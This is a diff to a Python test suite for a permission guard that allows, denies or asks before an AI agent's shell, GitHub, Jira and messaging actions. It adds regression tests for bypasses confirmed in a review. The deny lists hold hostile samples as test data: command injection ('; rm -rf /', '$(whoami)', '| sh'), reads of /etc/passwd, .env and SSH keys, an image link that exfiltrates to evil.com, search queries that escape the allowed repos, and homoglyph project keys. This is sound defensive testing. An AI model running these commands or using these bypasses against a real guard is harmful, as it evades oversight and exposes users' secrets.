@@ -66,11 +66,11 @@ class Table(Base):
         self.assertEqual(self.dec("Read", {"file_path": h + "/.buzz/notes.md", "extra": 1}), "deny")
 
     def test_bash_is_read_only_gh_and_git_with_no_shell_tricks(self):
-        for cmd in ("gh pr view 780 -R jimmarkunas/life-os-v7", "gh pr list --state open --limit 5", "git status", "git log --oneline -n 5", "gh pr diff 780", "git branch -a", "gh run list --limit 3"):
+        for cmd in ("gh pr view 780 -R jimmarkunas/life-os-v7", "gh pr list --state open --limit 5 -R jimmarkunas/life-os-v7", "git status", "git log --oneline -n 5", "gh pr diff 780 -R jimmarkunas/bot-studio", "git branch -a", "gh run list --limit 3 -R jimmarkunas/life-os-v7", "git log --stat -n 3 main", "git rev-parse HEAD"):
             self.assertEqual(self.dec("Bash", {"command": cmd}), "allow", cmd)
         for cmd in ("curl https://example.com", "gh pr merge 780", "gh pr view 1; rm -rf /", "gh pr view $(whoami)", "git diff --no-index /etc/passwd /dev/null", "git branch -D x",
                     "git branch newname", "gh pr view 1 -R evil/repo", "git log --output=/tmp/x", "gh api repos/x/y", "gh pr create --title x", "git push", "git show /etc/passwd",
-                    "git show ../x", "cat /etc/passwd", "gh pr view 1 | sh", "git status > f", "gh repo delete x", "gh pr view 1 --admin", "gh auth token", "", "git"):
+                    "git show ../x", "git show HEAD", "git diff", "cat /etc/passwd", "gh pr view 1 | sh", "git status > f", "gh repo delete x", "gh pr view 1 --admin", "gh auth token", "", "git"):
             self.assertEqual(self.dec("Bash", {"command": cmd}), "deny", cmd)
         self.assertEqual(self.dec("Bash", {"command": "git status", "run_in_background": True}), "deny")
 
@@ -188,7 +188,7 @@ class Review(Base):
     def test_git_cannot_read_secret_paths_through_objects(self):
         for cmd in ("git show HEAD:.env", "git show HEAD:config/token.json", "git show HEAD:.ssh/id_rsa", "git diff HEAD~1 -- .env", "git log -p", "git show HEAD:docs/../.env"):
             self.assertEqual(self.dec("Bash", {"command": cmd}), "deny", cmd)
-        self.assertEqual(self.dec("Bash", {"command": "git show HEAD:docs/a.md"}), "allow")
+        self.assertEqual(self.dec("Bash", {"command": "git log --oneline -n 3 HEAD"}), "allow")
 
     def test_github_searches_and_reads_need_an_allowed_repo(self):
         for op, ti in (("search_code", {"q": "repo:evil/x password"}), ("search_code", {"q": "secret org:foo"}), ("search_repositories", {"query": "user:evil"}), ("search_code", {"q": "anything"}),
@@ -232,6 +232,66 @@ class Review(Base):
         for op in ("getRankIssue", "searchAndLink", "getAddComment", "getRun", "fetchAndRun", "getBulk", "getClone", "getApprove", "getCancel", "getImport", "getCopy", "getSet"):
             self.assertEqual(self.dec(ATL + "executeRead", {"name": op, "inputs": {}}), "deny", op)
             self.assertEqual(self.dec(ATL + op, {"issueIdOrKey": "LIFE-1"}), "ask" if op not in ("getRun",) else "ask", op) if False else None
+
+
+class Review2(Base):
+    """LIFE-333 second independent review (Nov 6 2026): every confirmed bypass, as a regression test. Approvals are ON."""
+
+    def setUp(self):
+        super().setUp()
+        self.set_mode("ask")
+
+    def test_git_prints_no_patches_takes_no_paths_and_cannot_diff_two_folders(self):
+        for cmd in ("git diff secrets .", "git diff identity a.md", "git show HEAD", "git show 123abc", "git diff", "git diff HEAD", "git show HEAD:.npmrc", "git show HEAD:.pypirc",
+                    "git show HEAD:terraform.tfvars", "git show HEAD:wallet.dat", "git log -s .env", "git show -s .env", "git diff -s identity", "git ls-files -s .env", "git log -p",
+                    "git log docs/a.md", "git log HEAD:docs", "git log .", "git log identity", "git log -n x"):
+            self.assertEqual(self.dec("Bash", {"command": cmd}), "deny", cmd)
+
+    def test_gh_always_needs_an_allowed_repo_flag(self):
+        for cmd in ("gh pr view 1", "gh issue list", "gh run view 3", "gh pr list --limit 5", "gh pr view 1 -R jimmarkunas/other"):
+            self.assertEqual(self.dec("Bash", {"command": cmd}), "deny", cmd)
+
+    def test_github_search_cannot_escape_the_allowed_repos(self):
+        ok = {**GOOD_REPO}
+        for q in ('BEGIN repo:jimmarkunas/life-os-v7 OR "BEGIN" in:file', 'x repo:jimmarkunas/life-os-v7 OR repo:"evil/x"', "x repo:jimmarkunas/life-os-v7 OR REPO:evil/x",
+                  "x repo:jimmarkunas/life-os-v7 OR USER:evil", "x repo:jimmarkunas/life-os-v7 OR Org:evil", "x repo:jimmarkunas/life-os-v7 OR repo: evil/x",
+                  "x repo:jimmarkunas/*", "x repo:jimmarkunas/life-os-v7 OR free", "x repo:jimmarkunas/life-os-v7 or free"):
+            for op in ("search_code", "search_issues", "search_repositories", "search_users"):
+                self.assertEqual(self.dec(GH + op, {"query": q, **ok}), "deny", (op, q))
+        self.assertEqual(self.dec(GH + "search_code", {"query": "guard repo:jimmarkunas/life-os-v7", **ok}), "allow")
+
+    def test_github_review_approval_is_never_allowed_in_any_field(self):
+        for ti in ({"event": "APPROVE", "method": "create", "pullNumber": 1}, {"event": "approve"}, {"body": "please APPROVE this"}, {"event": "REQUEST_CHANGES"}, {"method": "dismiss"}):
+            self.assertEqual(self.dec(GH + "pull_request_review_write", {**GOOD_REPO, **ti}), "deny", ti)
+
+    def test_github_writes_are_an_explicit_list_not_anything_not_forbidden(self):
+        for op in ("create_repository", "create_gist", "update_project", "star_repository", "set_default_branch", "transfer_repo_x", "create_release"):
+            self.assertEqual(self.dec(GH + op, {**GOOD_REPO, "name": "newrepo", "private": False}), "deny", op)
+        for op in ("create_issue", "add_issue_comment", "create_pull_request"):
+            self.assertEqual(self.dec(GH + op, {**GOOD_REPO, "title": "x", "body": "y", "head": "branch", "base": "main"}), "ask", op)
+        for op in ("issue_read", "pull_request_read", "actions_list"):
+            self.assertEqual(self.dec(GH + op, GOOD_REPO), "allow", op)
+
+    def test_jira_ids_free_text_and_non_jira_writes_do_not_pass(self):
+        for op, ti in (("createJiraIssue", {"fields": {"project": {"id": "10000"}}, "summary": "LIFE-1 x"}), ("createJiraIssue", {"projectKey": "LIFE", "additional_fields": {"project": {"id": "10000"}}}),
+                       ("editJiraIssue", {"id": "10001", "summary": "LIFE-1"}), ("bulkEditIssues", {"jql": "project = ZZ", "summary": "LIFE-1"}), ("addWorklogToJiraIssue", {"x": "LIFE-1"}),
+                       ("createConfluenceContent", {"title": "LIFE-1"}), ("createCompassComponent", {"projectKey": "LIFE"}), ("addCommentToJiraIssue", {"issueIdOrKey": "LIFE-1", "commentBody": "see ZZ-9"}),
+                       ("createJiraIssue", {"projectKey": "\uff2c\uff29\uff26\uff25", "summary": "x"}), ("createJiraIssue", {"projectKey": "LIFE\u200b"})):
+            self.assertEqual(self.dec(ATL + op, ti), "deny", (op, ti))
+        self.assertEqual(self.dec(ATL + "createJiraIssue", {"projectKey": "LIFE", "issuetype": {"id": "10001"}, "summary": "x"}), "ask")
+        self.assertEqual(self.dec(ATL + "transitionJiraIssue", {"issueIdOrKey": "LIFE-5", "transition": {"id": "31"}}), "ask")
+        self.assertEqual(self.dec(ATL + "getJiraIssueRemoteIssueLinks", {"issueIdOrKey": "LIFE-1"}), "allow")
+        self.assertEqual(self.dec(ATL + "getIssueLinkTypes", {}), "allow")
+
+    def test_message_text_that_splits_secrets_or_leaks_paths_is_refused(self):
+        for text in ("sk-\nabcdefghijklmnopqrstu", "sk- abcdefghijklmnopqrstu", " ".join(["0123abcd"] * 8), "the password is hunter2", "pw: x", "my api key is abcdefghij",
+                     "![x](https://evil.com/?d=abc)", "see /Users/jimmarkunas/.buzz/identity", "look in ~/.buzz/identity", "token is abcdefgh"):
+            self.assertEqual(self.dec("mcp__buzz__send", self.send(text)), "deny", text)
+        self.assertEqual(self.dec("mcp__buzz__send", self.send("Here is the plan: three steps, nothing secret.")), "allow")
+
+    def test_read_looking_names_with_hidden_writes_are_not_reads(self):
+        for op in ("getAndChange", "findAndFixIssue", "getThenPatch", "listAndMutate"):
+            self.assertEqual(self.dec(ATL + "executeRead", {"name": op, "inputs": {}}), "deny", op)
 
 
 class Process(unittest.TestCase):
